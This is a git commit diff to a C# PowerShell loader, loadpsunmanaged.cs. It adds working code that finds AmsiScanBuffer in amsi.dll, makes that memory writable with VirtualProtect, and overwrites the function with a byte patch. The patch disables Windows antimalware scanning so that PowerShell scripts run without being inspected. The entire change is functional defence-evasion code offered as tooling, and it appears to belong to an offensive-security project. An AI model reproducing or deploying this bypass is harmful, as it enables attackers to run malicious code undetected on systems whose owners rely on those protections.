05b65c871e4eb22b3ecae003443001e95f684f69
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2021-07-19 12:37:06 -0400

    Update loadpsunmanaged.cs

--- loadpsunmanaged.cs
+++ loadpsunmanaged.cs
@@ -7,13 +7,32 @@ using System.Management.Automation;
 using System.Collections.ObjectModel;
 using System.Management.Automation.Runspaces;
 using System.IO;
+using System.Runtime.InteropServices;
 
 namespace unmanagedps
 {
     class Program
     {
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         static void Main(string[] args)
         {
+            IntPtr amsi = LoadLibrary("amsi.dll");
+            IntPtr AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+            Byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+  
+            Console.WriteLine("amsi.dll!AmsiScanBuffer at 0x{0}", AmsiScanBuffer.ToString("X2"));
+
+            uint retval = 0;
+
+            VirtualProtect(AmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out retval);
+            Marshal.Copy(patch, 0, AmsiScanBuffer, patch.Length);
+            VirtualProtect(AmsiScanBuffer, (UIntPtr)patch.Length, 0x20, out retval);
+
             StringBuilder sb = new StringBuilder();
             try
             {
